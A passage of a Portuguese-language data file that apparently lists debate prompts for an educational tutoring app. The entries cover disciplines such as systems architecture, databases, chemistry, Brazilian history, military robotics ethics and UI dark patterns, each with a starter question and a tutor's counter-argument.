    mappedDifficulty: "Dificuldade na Sessão de Debates: Conceituação de capital cultural (Bourdieu) e agência individual"
  },
  {
    id: "deb-analise-projeto-sistemas",
    disciplineId: "analise-projeto-sistemas",
    disciplineName: "Análise e Projeto de Sistemas",
    title: "Arquiteturas Monolíticas vs. Microsserviços: Simplicidade ou Escalabilidade Excessiva?",
    theme: "Padrões Arquiteturais",
    starterPrompt: "Para startups e projetos educacionais em crescimento, deve-se adotar microsserviços desde o primeiro dia para garantir escalabilidade futura, ou deve-se começar obrigatoriamente com um monólito modular bem testado?",
    tutorCounterArg: "Você defende começar com microsserviços. Contudo, em equipes pequenas, o custo cognitivo de gerenciar redes de orquestração (Kubernetes), latência de rede e transações distribuídas muitas vezes mata a empresa antes que ela atinja a escala necessária. Como você justifica essa sobrecarga prematura?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Trade-offs de acoplamento, coesão e complexidade operacional"
  },
  {
    id: "deb-quimica",
    disciplineId: "quimica",
    disciplineName: "Química",
    title: "Uso de Agrotóxicos e Defensivos Químicos na Agricultura em Larga Escala",
    theme: "Química Ambiental & Toxicologia",
    starterPrompt: "A utilização de defensivos agrícolas sintéticos é indispensável para alimentar a população mundial de 8 bilhões de pessoas ou deve ser banida em favor da agroecologia orgânica?",
    tutorCounterArg: "Você afirma que a agroecologia supre toda a demanda global. No entanto, estudos agronômicos demonstram que sem defensivos químicos e fertilizantes nitrogenados sintetizados (Haber-Bosch), a produtividade de grãos cairia em até 45%, gerando fome imediata e exigindo desmatamento em dobro para compensar a colheita. Como solucionar esse paradoxo?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Cinética de degradação, bioacumulação e segurança alimentar"
  },
  {
    id: "deb-banco-de-dados",
    disciplineId: "banco-de-dados",
    disciplineName: "Banco de Dados",
    title: "Bancos Relacionais (SQL com ACID) vs. Bancos Não-Relacionais (NoSQL / BASE)",
    theme: "Engenharia de Dados",
    starterPrompt: "Para aplicações financeiras e acadêmicas de alta concorrência, o modelo relacional (SQL) com propriedades ACID é insubstituível, ou bancos NoSQL orientados a documentos e chave-valor já são superiores em flexibilidade e velocidade?",
    tutorCounterArg: "Se os bancos NoSQL oferecem maior escalabilidade horizontal, como você garante a consistência imediata de saldo financeiro de milhões de contas concorrentes sem o isolamento estrito e a atomicidade transacional que apenas os bancos SQL ACID fornecem nativamente?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Teorema CAP e garantias de consistência em sistemas concorrentes"
  },
  {
    id: "deb-lingua-portuguesa-redacao",
    disciplineId: "lingua-portuguesa-redacao",
    disciplineName: "Língua Portuguesa & Redação",
    title: "Variação Linguística e Preconceito Linguístico na Escola e no Mercado",
    theme: "Sociolinguística & Norma-Padrão",
    starterPrompt: "A escola deve cobrar exclusivamente o domínio da norma-padrão culta como passaporte de cidadania, ou deve acolher plenamente as variedades linguísticas populares regionais e combater o preconceito linguístico?",
    tutorCounterArg: "Se a escola relativizar inteiramente o ensino formal da norma culta em nome da aceitação das variações, ela não estaria desarmando os estudantes das classes populares para a disputa em concursos, vestibulares e entrevistas onde a elite exige rigor gramatical?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Distinção entre inadequação situacional e erro gramatical estrutural"
  },
  {
    id: "deb-desenvolvimento-web",
    disciplineId: "desenvolvimento-web",
    disciplineName: "Desenvolvimento Web",
    title: "Single-Page Applications (SPAs em JavaScript) vs. Multi-Page Tradicionais (SSR / MPA)",
    theme: "Arquitetura Frontend Web",
    starterPrompt: "O ecossistema web moderno com SPAs pesadas em React e bundles de JavaScript de centenas de megabytes tornou a web mais lenta e excludente em dispositivos modestos, devendo-se retornar a páginas estáticas geradas no servidor (SSR/HTML puro)?",
    tutorCounterArg: "Você propõe retorno ao HTML puro com reload completo de página. Mas como você proporciona experiências interativas fluidas em tempo real (como editores colaborativos, gráficos dinâmicos e videochamadas) sem o gerenciamento fino de estado no lado do cliente que as SPAs oferecem?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Métrica Core Web Vitals (LCP, FID/INP, CLS) e hidratação de cliente"
  },
  {
    id: "deb-historia",
    disciplineId: "historia",
    disciplineName: "História",
    title: "A Constituição de 1934 e a Era Vargas: Paternalismo ou Conquista Operária?",
    theme: "História do Brasil & Cidadania",
    starterPrompt: "A Consolidação das Leis do Trabalho e a Carta de 1934 foram uma concessão paternalista de Getúlio Vargas para cooptar o operariado, ou uma conquista histórica autêntica das lutas sindicais?",
    tutorCounterArg: "Interessante proposição. Porém, se considerarmos a Carta de 1934 sob a ótica jurídica estrita, o artigo 120 subordinou os sindicatos ao enquadramento do Ministério do Trabalho através da 'unicidade sindical'. Como você sustenta a autonomia operária se o próprio Estado detinha o poder de intervir e cassar diretorias dissidentes?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Fundamentação jurídica da Constituição de 1934 e corporativismo"
  },
  {
    id: "deb-robotica",
    disciplineId: "robotica",
    disciplineName: "Robótica & Sistemas Embarcados",
    title: "Autonomia Bélica: Drones e Robôs Armados com Tomada de Decisão por IA",
    theme: "Ética na Robótica Militar",
    starterPrompt: "Sistemas robóticos autônomos de combate devem ter permissão para disparar contra alvos humanos sem intervenção de um operador humano no loop (Human-in-the-Loop)?",
    tutorCounterArg: "Você defende a obrigatoriedade da presença humana. Mas em cenários de guerra cibernética com guerra eletrônica bloqueando sinais de rádio em nanossegundos, uma máquina sem autonomia de resposta não seria destruída instantaneamente por drones hipersônicos do adversário?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Responsabilidade moral e algoritmo de decisão em sistemas autônomos"
  },
  {
    id: "deb-design-de-interface",
    disciplineId: "design-de-interface",
    disciplineName: "Design de Interface (UI/UX)",
    title: "Padrões Escuros (Dark Patterns) no Design de Interfaces Digitais",
    theme: "Ética em Design de Interação",
    starterPrompt: "O uso de designs persuasivos (como contadores regressivos de urgência e cancelamento de assinaturas em múltiplos labirintos de cliques) deve ser criminalizado por lei ou faz parte da livre estratégia comercial de conversão de negócios?",
    tutorCounterArg: "Se o Estado começar a legislar sobre a disposição exata de botões e cores em um website, como delimitar a fronteira entre o que é persuasão legítima de marketing digital e o que é manipulação cognitiva abusiva sem sufocar a inovação de produto?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Heurísticas de Nielsen e limites éticos do design comportamental"
  },
  {
    id: "deb-empreendedorismo-social",
    disciplineId: "empreendedorismo-social",
    disciplineName: "Empreendedorismo Social",
    title: "Empresas com Fins Lucrativos Podem Realmente Resolver Problemas Sociais?",
    theme: "Negócios de Impacto & Capitalismo Social",
    starterPrompt: "Negócios sociais que visam lucro podem gerar impacto coletivo sustentável e ético, ou a busca por retorno financeiro inevitavelmente corrompe a missão humanitária?",
    tutorCounterArg: "Organizações sem fins lucrativos (ONGs) vivem sob constante incerteza de doações filantrópicas e subsídios políticos voláteis. Uma empresa social com produto escalável e receita recorrente não possui muito maior capacidade de sobrevivência a longo prazo para atender milhões de pessoas vulneráveis?",
    mappedDifficulty: "Dificuldade na Sessão de Debates: Sustentabilidade financeira versus desvio de missão (mission drift)"
  }
];
